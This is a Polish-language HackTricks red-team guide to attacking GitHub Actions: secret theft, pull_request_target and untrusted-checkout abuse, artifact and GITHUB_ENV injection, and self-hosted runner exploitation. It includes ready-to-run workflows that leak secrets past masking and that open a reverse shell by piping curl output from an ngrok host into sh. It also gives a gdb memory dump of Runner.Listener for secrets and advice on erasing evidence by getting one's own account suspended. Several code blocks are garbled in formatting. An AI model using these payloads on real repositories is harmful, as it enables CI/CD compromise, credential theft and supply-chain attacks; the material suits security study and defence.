# Abusing Github Actions

<details>

<summary><strong>Nauka hakowania AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.

</details>

## Podstawowe informacje

Na tej stronie znajdziesz:

* **Podsumowanie wszystkich skutków**, gdy atakujący uzyska dostęp do akcji Github
* Różne sposoby **uzyskania dostępu do akcji**:
* Posiadanie **uprawnień** do tworzenia akcji
* Nadużywanie wyzwalaczy związanych z **pull requestami**
* Nadużywanie **innych technik zewnętrznego dostępu**
* **Pivotowanie** z już skompromitowanego repozytorium
* Na koniec sekcja o **technikach post-eksploatacyjnych do nadużycia akcji od wewnątrz** (spowodowanie wspomnianych skutków)

## Podsumowanie skutków

Dla wprowadzenia do [**Akcji Github sprawdź podstawowe informacje**](../basic-github-information.md#github-actions).

W przypadku, gdy możesz **wykonywać dowolne akcje Github/wstrzykiwać kod** w **repozytorium**, możesz:

* **Ukradnij** **sekrety** z tego repozytorium/organizacji.
* Jeśli możesz tylko wstrzyknąć, możesz ukraść to, co już jest obecne w przepływie pracy.
* Nadużyj **uprawnienia repozytorium** do dostępu do innych platform, takich jak AWS i GCP.
* **Wykonaj kod w niestandardowych pracownikach** (jeśli są używane niestandardowe pracowniki) i spróbuj przejść stamtąd.
* **Nadpisz** kod repozytorium.
* To zależy od uprawnień `GITHUB_TOKEN` (jeśli takie są).
* **Znieważ** **wdrożenia** i inne **artyfakty**.
* Jeśli kod jest wdrażany lub przechowuje coś, możesz to zmodyfikować i uzyskać dalszy dostęp.

## GITHUB\_TOKEN

Ten "**sekret**" (pochodzący z `${{ secrets.GITHUB_TOKEN }}` i `${{ github.token }}`) jest udzielany, gdy administrator włącza tę opcję:

<figure><img src="../../../.gitbook/assets/image (92).png" alt=""><figcaption></figcaption></figure>

Ten token jest taki sam, jakiego użyje **Aplikacja Github**, więc może uzyskać dostęp do tych samych punktów końcowych: [https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

{% hint style="warning" %}
Github powinien wydać [**przepływ**](https://github.com/github/roadmap/issues/74), który **umożliwia dostęp między repozytoriami** w GitHubie, dzięki czemu repozytorium może uzyskać dostęp do innych wewnętrznych repozytoriów za pomocą `GITHUB_TOKEN`.
{% endhint %}

Możesz zobaczyć możliwe **uprawnienia** tego tokenu w: [https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token)

Zauważ, że token **wygasa po zakończeniu zadania**.\
Te tokeny wyglądają tak: `ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

Kilka interesujących rzeczy, które możesz zrobić z tym tokenem:

{% tabs %}
{% tab title="Scal PR" %}
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"commit_title":"commit_title"}'
```
{% endtab %}

{% tab title="Zatwierdź PR" %}
```bash
# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'
```
{% endtab %}

{% tab title="Utwórz PR" %}
```bash
# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{% endtab %}
{% endtabs %}

{% hint style="danger" %}
Zauważ, że w kilku przypadkach możesz znaleźć **tokeny użytkownika GitHub w zmiennych środowiskowych GitHub Actions lub w sekretach**. Te tokeny mogą dać Ci większe uprawnienia w repozytorium i organizacji.
{% endhint %}

<details>

<summary>Wyświetl listę sekretów w wynikach działania GitHub</summary>

\`\`\`yaml name: list\_env on: workflow\_dispatch: # Launch manually pull\_request: #Run it when a PR is created to a branch branches: - '\*\*' push: # Run it when a push is made to a branch branches: - '\*\*' jobs: List\_env: runs-on: ubuntu-latest steps: - name: List Env # Need to base64 encode or github will change the secret value for "\*\*\*" run: sh -c 'env | grep "secret\_" | base64 -w0' env: secret\_myql\_pass: $\{{secrets.MYSQL\_PASSWORD\}} secret\_postgress\_pass: $\{{secrets.POSTGRESS\_PASSWORDyaml\}} \`\`\`

</details>

<details>

<summary>Uzyskaj odwrotną powłokę za pomocą sekretów</summary>

\`\`\`yaml name: revshell on: workflow\_dispatch: # Launch manually pull\_request: #Run it when a PR is created to a branch branches: - '\*\*' push: # Run it when a push is made to a branch branches: - '\*\*' jobs: create\_pull\_request: runs-on: ubuntu-latest steps: - name: Get Rev Shell run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh' env: secret\_myql\_pass: $\{{secrets.MYSQL\_PASSWORD\}} secret\_postgress\_pass: $\{{secrets.POSTGRESS\_PASSWORDyaml\}} \`\`\`

</details>

Możliwe jest sprawdzenie uprawnień udzielonych dla Tokena Github w repozytoriach innych użytkowników **sprawdzając logi** działań:

<figure><img src="../../../.gitbook/assets/image (97).png" alt="" width="269"><figcaption></figcaption></figure>

## Dozwolone Wykonanie

{% hint style="info" %}
To byłby najłatwiejszy sposób na skompromitowanie działań Github, ponieważ w tym przypadku zakłada się, że masz dostęp do **utworzenia nowego repozytorium w organizacji**, lub masz **uprawnienia do zapisu w repozytorium**.

Jeśli jesteś w takim scenariuszu, możesz po prostu sprawdzić [techniki post-eksploatacyjne](./#post-exploitation-techniques-from-inside-an-action).
{% endhint %}

### Wykonanie poprzez Utworzenie Repozytorium

W przypadku gdy członkowie organizacji mogą **tworzyć nowe repozytoria** i możesz wykonywać działania github, możesz **utworzyć nowe repozytorium i ukraść tajne informacje ustawione na poziomie organizacji**.

### Wykonanie z Nowej Gałęzi

Jeśli możesz **utworzyć nową gałąź w repozytorium, które już zawiera skonfigurowane działanie Github Action**, możesz je **zmodyfikować**, **przesłać** zawartość, a następnie **wykonać to działanie z nowej gałęzi**. W ten sposób możesz **wydobyć tajne informacje na poziomie repozytorium i organizacji** (ale musisz wiedzieć, jak są one nazwane).

Możesz sprawić, że zmodyfikowane działanie będzie wykonywalne **ręcznie**, gdy zostanie **utworzone PR** lub gdy **jakiś kod zostanie przesłany** (w zależności od tego, jak bardzo chcesz być uciążliwy):

```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name

# Use '**' instead of a branh name to trigger the action in all the cranches
```

***

## Wykonanie rozgałęzione

{% hint style="info" %}
Istnieją różne wyzwalacze, które mogą umożliwić atakującemu **wykonanie akcji Github z innego repozytorium**. Jeśli te akcje wyzwalające są źle skonfigurowane, atakujący może je skompromitować.
{% endhint %}

### `pull_request`

Wyzwalacz workflow **`pull_request`** uruchomi workflow za każdym razem, gdy zostanie otrzymany pull request, z pewnymi wyjątkami: domyślnie, jeśli to jest **pierwszy raz**, gdy **współpracujesz**, jakiś **opiekun** będzie musiał **zatwierdzić** **uruchomienie** workflow:

<figure><img src="../../../.gitbook/assets/image (4) (2).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Ponieważ **domyślne ograniczenie** dotyczy **nowych** współpracowników, możesz przyczynić się do **naprawy ważnego błędu/pomyłki** i następnie wysłać **inne PR-y, aby nadużyć nowych uprawnień `pull_request`**.

**Przetestowałem to i nie działa**: ~~Inną opcją byłoby utworzenie konta o nazwie osoby, która przyczyniła się do projektu i usunęła swoje konto.~~
{% endhint %}

Co więcej, domyślnie **zapobiega dostępowi do zapisu** i **tajemnic** w repozytorium docelowym, jak wspomniano w [**dokumentacji**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories):

> Z wyjątkiem `GITHUB_TOKEN`, **tajemnice nie są przekazywane do wykonawcy** podczas uruchamiania workflow z **rozgałęzionego** repozytorium. **`GITHUB_TOKEN` ma uprawnienia tylko do odczytu** w pull requestach **z rozgałęzionych repozytoriów**.

Atakujący mógłby zmodyfikować definicję akcji Github w celu wykonania dowolnych działań i dołączenia arbitralnych akcji. Niemniej jednak nie będzie mógł ukraść tajemnic ani nadpisać repozytorium ze względu na wspomniane ograniczenia.

{% hint style="danger" %}
**Tak, jeśli atakujący zmieni w PR akcję Github, która zostanie wywołana, jego akcja Github będzie używana, a nie ta z repozytorium źródłowego!**
{% endhint %}

Ponieważ atakujący kontroluje również kod, który jest wykonywany, nawet jeśli nie ma tajemnic ani uprawnień do zapisu na `GITHUB_TOKEN`, atakujący mógłby na przykład **przesłać złośliwe artefakty**.

### **`pull_request_target`**

Wyzwalacz workflow **`pull_request_target`** ma **uprawnienia do zapisu** w repozytorium docelowym i **dostęp do tajemnic** (i nie prosi o zgodę).

Zauważ, że wyzwalacz workflow **`pull_request_target`** **uruchamia się w kontekście bazowym** a nie w tym podanym przez PR (aby **nie wykonywać niezaufanego kodu**). Aby uzyskać więcej informacji na temat `pull_request_target` [**sprawdź dokumentację**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull\_request\_target).\
Ponadto, aby uzyskać więcej informacji na temat tego konkretnego niebezpiecznego użycia, sprawdź ten [**post na blogu Githuba**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/).

Może się wydawać, że ponieważ **wykonywane workflow** jest zdefiniowane w **bazie**, a nie w PR, jest **bezpieczne** korzystanie z **`pull_request_target`**, ale istnieją **przypadki, w których nie jest**.

A ten będzie miał **dostęp do tajemnic**.

### `workflow_run`

Wyzwalacz [**workflow\_run**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow\_run) pozwala uruchomić workflow z innego, gdy jest on `completed`, `requested` lub `in_progress`.

W tym przykładzie workflow jest skonfigurowane do uruchomienia po zakończeniu oddzielnego workflow "Run Tests":

```yaml
on:
workflow_run:
workflows: [Run Tests]
types:
- completed
```

Ponadto, zgodnie z dokumentacją: Przepływ rozpoczęty przez zdarzenie `workflow_run` ma **dostęp do tajemnic i możliwość zapisywania tokenów, nawet jeśli poprzedni przepływ tego nie robił**.

Tego rodzaju przepływ może być zaatakowany, jeśli **zależy** on od **przepływu**, który może zostać **uruchomiony** przez zewnętrznego użytkownika za pośrednictwem **`pull_request`** lub **`pull_request_target`**. Kilka przykładów podatnych przypadków można znaleźć w [**tym blogu**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability)**.** Pierwszy polega na tym, że przepływ uruchomiony przez zdarzenie **`workflow_run`** pobiera kod atakującego: `${{ github.event.pull_request.head.sha }}`\
Drugi polega na **przekazywaniu** artefaktu z **niezaufanego** kodu do przepływu **`workflow_run`** i wykorzystywaniu zawartości tego artefaktu w sposób, który czyni go **podatnym na RCE**.

### `workflow_call`

TODO

TODO: Sprawdź, czy podczas wykonywania z `pull\_request` użyty/pobrany kod pochodzi z oryginału czy z forka PR

## Nadużycie wykonania z forka

Wymieniliśmy wszystkie sposoby, w jakie zewnętrzny atakujący mógłby zmusić przepływ github do wykonania, teraz przyjrzyjmy się, jak te wykonania, jeśli są źle skonfigurowane, mogą być wykorzystane:

### Wykonanie niezaufanego checkout

W przypadku **`pull_request`,** przepływ zostanie wykonany w **kontekście PR** (więc wykonany zostanie **złośliwy kod PR**), ale ktoś musi go **autoryzować najpierw** i będzie działał z pewnymi [ograniczeniami](./#pull\_request).

W przypadku przepływu korzystającego z **`pull_request_target` lub `workflow_run`**, który zależy od przepływu, który może być uruchomiony z **`pull_request_target` lub `pull_request`**, kod z oryginalnego repozytorium zostanie wykonany, więc **atakujący nie może kontrolować wykonanego kodu**.

{% hint style="danger" %}
Jednak jeśli **akcja** ma **wyraźne sprawdzenie PR**, które **pobierze kod z PR** (a nie z bazy), zostanie użyty kod kontrolowany przez atakującego. Na przykład (sprawdź linię 12, gdzie kod PR jest pobierany):
{% endhint %}

<pre class="language-yaml"><code class="lang-yaml"># NIEBEZPIECZNE. Przedstawione tylko jako przykład.
on:
pull_request_target

jobs:
build:
name: Build and test
runs-on: ubuntu-latest
steps:
<strong>    - uses: actions/checkout@v2
</strong><strong>      with:
</strong><strong>        ref: ${{ github.event.pull_request.head.sha }}
</strong>
- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
Thank you!
</code></pre>

Potencjalnie **niezaufany kod jest uruchamiany podczas `npm install` lub `npm build`** ponieważ skrypty budowania i używane **pakiety są kontrolowane przez autora PR**.

{% hint style="warning" %}
Dork githubowy do wyszukiwania podatnych akcji to: `event.pull_request pull_request_target extension:yml` jednak istnieją różne sposoby konfigurowania zadań do bezpiecznego wykonania, nawet jeśli akcja jest skonfigurowana w sposób niebezpieczny (np. używając warunków dotyczących tego, kto jest aktorem generującym PR).
{% endhint %}

### Wstrzykiwanie Skryptów Kontekstu <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

Zauważ, że istnieją pewne [**konteksty githubowe**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context), których wartości są **kontrolowane** przez **użytkownika** tworzącego PR. Jeśli akcja githuba używa tych **danych do wykonania czegokolwiek**, może to prowadzić do **wykonania arbitralnego kodu:**

{% content-ref url="gh-actions-context-script-injections.md" %}
[gh-actions-context-script-injections.md](gh-actions-context-script-injections.md)
{% endcontent-ref %}

### **Wstrzykiwanie Skryptów GITHUB\_ENV** <a href="#what-is-usdgithub_env" id="what-is-usdgithub_env"></a>

Z dokumentacji: Możesz udostępnić **zmienną środowiskową** do wszystkich kolejnych kroków w zadaniu przepływu, definiując lub aktualizując zmienną środowiskową i zapisując ją do pliku środowiskowego **`GITHUB_ENV`**.

Jeśli atakujący mógłby **wstrzyknąć jakąkolwiek wartość** do tej **zmiennej środowiskowej**, mógłby wstrzyknąć zmienne środowiskowe, które mogłyby wykonać kod w następnych krokach, takie jak **LD\_PRELOAD** lub **NODE\_OPTIONS**.

Na przykład ([**to**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0) i [**to**](https://www.legitsecurity.com/blog/-how-we-found-another-github-action-environment-injection-vulnerability-in-a-google-project)), wyobraź sobie przepływ, który ufa przesłanemu artefaktowi, aby przechować jego zawartość w zmiennej środowiskowej **`GITHUB_ENV`**. Atakujący mógłby przesłać coś takiego, aby go skompromitować:

<figure><img src="../../../.gitbook/assets/image (3) (2).png" alt=""><figcaption></figcaption></figure>

### Podatne Akcje Githuba od Firm Trzecich

#### [dawidd6/action-download-artifact](https://github.com/dawidd6/action-download-artifact)

Jak wspomniano w [**tym wpisie na blogu**](https://www.legitsecurity.com/blog/github-actions-that-open-the-door-to-cicd-pipeline-attacks), ta Akcja Githuba pozwala na dostęp do artefaktów z różnych przepływów i nawet repozytoriów.

Problem polega na tym, że jeśli parametr **`path`** nie jest ustawiony, artefakt jest wypakowywany w bieżącym katalogu i może nadpisać pliki, które mogą być później używane lub nawet wykonane w przepływie. Dlatego, jeśli Artefakt jest podatny, atakujący mógłby wykorzystać to do skompromitowania innych przepływów ufających Artefaktowi.

Przykład podatnego przepływu:

```yaml
on:
workflow_run:
workflows: ["some workflow"]
types:
- completed

jobs:
success:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
- name: download artifact
uses: dawidd6/action-download-artifact
with:
workflow: ${{ github.event.workflow_run.workflow_id }}
name: artifact
- run: python ./script.py
with:
name: artifact
path: ./script.py
```

To można zaatakować za pomocą tego workflow:

```yaml
name: "some workflow"
on: pull_request

jobs:
upload:
runs-on: ubuntu-latest
steps:
- run: echo "print('exploited')" > ./script.py
- uses actions/upload-artifact@v2
with:
name: artifact
path: ./script.py
```

***

## Inne zewnętrzne dostępy

### Przechwytywanie repozytorium z usuniętym przestrzenią nazw

Jeśli konto zmieni swoją nazwę, inny użytkownik może zarejestrować konto o tej samej nazwie po pewnym czasie. Jeśli repozytorium miało **mniej niż 100 gwiazdek przed zmianą nazwy**, Github pozwoli nowo zarejestrowanemu użytkownikowi o tej samej nazwie utworzyć **repozytorium o tej samej nazwie** jak to usunięte.

{% hint style="danger" %}
Jeśli działanie korzysta z repozytorium nieistniejącego konta, nadal istnieje możliwość, że atakujący może utworzyć to konto i naruszyć działanie.
{% endhint %}

Jeśli inne repozytoria korzystały z **zależności z repozytoriów tego użytkownika**, atakujący będzie mógł je przejąć. Tutaj znajdziesz bardziej kompletną wyjaśnienie: [https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

***

## Przełączanie repozytoriów

{% hint style="info" %}
W tej sekcji omówimy techniki, które umożliwią **przełączenie się z jednego repozytorium na inne**, zakładając, że mamy pewien rodzaj dostępu do pierwszego (sprawdź poprzednią sekcję).
{% endhint %}

### Zatrucie pamięci podręcznej

Pamięć podręczna jest utrzymywana między **uruchomieniami przepływu pracy w tej samej gałęzi**. Oznacza to, że jeśli atakujący **naruszy** **pakiet**, który jest następnie przechowywany w pamięci podręcznej i **pobrany** oraz wykonany przez **bardziej uprzywilejowany** przepływ pracy, będzie mógł również **naruszyć** ten przepływ pracy.

{% content-ref url="gh-actions-cache-poisoning.md" %}
[gh-actions-cache-poisoning.md](gh-actions-cache-poisoning.md)
{% endcontent-ref %}

### Zatrucie artefaktów

Przepływy pracy mogą korzystać z **artefaktów z innych przepływów pracy i nawet repozytoriów**, jeśli atakujący zdoła **naruszyć** działanie Github Action, który **przesyła artefakt**, który później jest używany przez inny przepływ pracy, może **naruszyć inne przepływy pracy**:

{% content-ref url="gh-actions-artifact-poisoning.md" %}
[gh-actions-artifact-poisoning.md](gh-actions-artifact-poisoning.md)
{% endcontent-ref %}

***

## Po wykorzystaniu z działania

### Dostęp do AWS i GCP za pomocą OIDC

Sprawdź następujące strony:

{% content-ref url="../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

{% content-ref url="../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md" %}
[gcp-federation-abuse.md](../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md)
{% endcontent-ref %}

### Dostęp do sekretów <a href="#accessing-secrets" id="accessing-secrets"></a>

Jeśli wstrzykujesz zawartość do skryptu, warto wiedzieć, jak uzyskać dostęp do sekretów:

* Jeśli sekret lub token jest ustawiony jako **zmienna środowiskowa**, można go bezpośrednio uzyskać przez środowisko za pomocą **`printenv`**.

<details>

<summary>Wyświetl sekrety w wyniku działania Github Action</summary>

\`\`\`yaml name: list\_env on: workflow\_dispatch: # Launch manually pull\_request: #Run it when a PR is created to a branch branches: - '\*\*' push: # Run it when a push is made to a branch branches: - '\*\*' jobs: List\_env: runs-on: ubuntu-latest steps: - name: List Env # Need to base64 encode or github will change the secret value for "\*\*\*" run: sh -c 'env | grep "secret\_" | base64 -w0' env: secret\_myql\_pass: $\{{secrets.MYSQL\_PASSWORD\}}

secret\_postgress\_pass: $\{{secrets.POSTGRESS\_PASSWORDyaml\}}

````
</details>

<details>

<summary>Uzyskaj odwrotną powłokę za pomocą sekretów</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
````

</details>

* Jeśli sekret jest używany **bezpośrednio w wyrażeniu**, wygenerowany skrypt powłoki jest przechowywany **na dysku** i jest dostępny.
* ```bash
  ```

cat /home/runner/work/\_temp/\*

````
* Dla działań w języku JavaScript sekrety są przesyłane za pomocą zmiennych środowiskowych
* ```bash
ps axe | grep node
````

* Dla **niestandardowej akcji**, ryzyko może się różnić w zależności od tego, w jaki sposób program wykorzystuje sekret uzyskany z **argumentu**:

```yaml
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

### Nadużywanie własnych maszyn

Sposób na znalezienie, które **działania Github Actions są wykonywane w infrastrukturze spoza Githuba**, to wyszukiwanie **`runs-on: self-hosted`** w konfiguracji działania Github Action yaml.

Maszyny **własne** mogą mieć dostęp do **bardziej wrażliwych informacji**, do innych **systemów sieciowych** (narażonych punktów końcowych w sieci? usługi metadanych?) lub, nawet jeśli jest izolowana i zniszczona, **może być uruchomionych więcej niż jedno działanie jednocześnie**, a złośliwe działanie może **ukraść sekrety** z innego.

Na maszynach własnych można również uzyskać **sekrety z procesu \_Runner.Listener**, który będzie zawierał wszystkie sekrety przepływów pracy na dowolnym etapie poprzez zrzucenie jego pamięci:

{% code overflow="wrap" %}
```bash
sudo apt-get install -y gdb
sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
```
{% endcode %}

Sprawdź [**ten post po więcej informacji**](https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/).

### Rejestr obrazów Docker w Github

Możliwe jest stworzenie działań Github, które będą **budować i przechowywać obraz Docker w Github**.\
Przykład można znaleźć w poniższym rozkładzie:

<details>

<summary>Akcja Github Build &#x26; Push obrazu Docker</summary>

\`\`\`yaml \[...]

* name: Set up Docker Buildx uses: docker/setup-buildx-action@v1
* name: Login to GitHub Container Registry uses: docker/login-action@v1 with: registry: ghcr.io username: $\{{ github.repository\_owner \}} password: $\{{ secrets.ACTIONS\_TOKEN \}}
* name: Add Github Token to Dockerfile to be able to download code run: | sed -i -e 's/TOKEN=##VALUE##/TOKEN=$\{{ secrets.ACTIONS\_TOKEN \}}/g' Dockerfile
* name: Build and push uses: docker/build-push-action@v2 with: context: . push: true tags: | ghcr.io/$\{{ github.repository\_owner \}}/$\{{ github.event.repository.name \}}:latest ghcr.io/$\{{ github.repository\_owner \}}/$\{{ github.event.repository.name \}}:$\{{ env.GITHUB\_NEWXREF \}}-$\{{ github.sha \}}

\[...]

````
</details>

Jak można zauważyć w poprzednim kodzie, rejestr Github jest hostowany w **`ghcr.io`**.

Użytkownik z uprawnieniami do odczytu repozytorium będzie w stanie pobrać obraz Dockera, używając tokena dostępu osobistego:
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
````

Następnie użytkownik mógłby wyszukać **wycieki sekretów w warstwach obrazu Docker:**

#### Wrażliwe informacje w logach Github Actions

Nawet jeśli **Github** próbuje **wykryć wartości sekretne** w logach działań i **unika ich pokazywania**, **inne wrażliwe dane**, które mogły zostać wygenerowane podczas wykonywania działania, nie zostaną ukryte. Na przykład JWT podpisany wartością sekretną nie zostanie ukryty, chyba że zostanie to [specjalnie skonfigurowane](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret).

### Zakrywanie swoich śladów

(Technika z [**tutaj**](https://divyanshu-mehta.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit)) Po pierwsze, każde PR podniesione jest jasno widoczne publicznie w Github i dla docelowego konta GitHub. W GitHub domyślnie **nie możemy usunąć PR z internetu**, ale jest haczyk. Dla kont GitHub, które są **zawieszone** przez GitHub, wszystkie ich **PR są automatycznie usuwane** i usunięte z internetu. Więc aby ukryć swoją aktywność, musisz albo zawiesić swoje **konto GitHub albo oznaczyć swoje konto**. Spowoduje to, że **wszystkie twoje działania** na GitHubie zostaną ukryte przed internetem (w zasadzie usunięte zostaną wszystkie twoje PR z exploitami)

Organizacja w GitHub jest bardzo aktywna w zgłaszaniu kont do GitHub. Wystarczy udostępnić "jakieś rzeczy" w Issue, a oni upewnią się, że twoje konto zostanie zawieszone w ciągu 12 godzin :p i oto masz, zrobiłeś swoje exploit niewidocznym na github.

Jedynym sposobem dla organizacji, aby dowiedzieć się, że zostały zaatakowane, jest sprawdzenie logów GitHub z SIEM, ponieważ z interfejsu GitHub PR zostanie usunięty.

### Narzędzia

Następujące narzędzia są przydatne do znajdowania przepływów pracy Github Actions i nawet znajdowania podatnych:

* [https://github.com/CycodeLabs/raven](https://github.com/CycodeLabs/raven)
* [https://github.com/carlospolop/PurplePanda](https://github.com/carlospolop/PurplePanda)

</details>
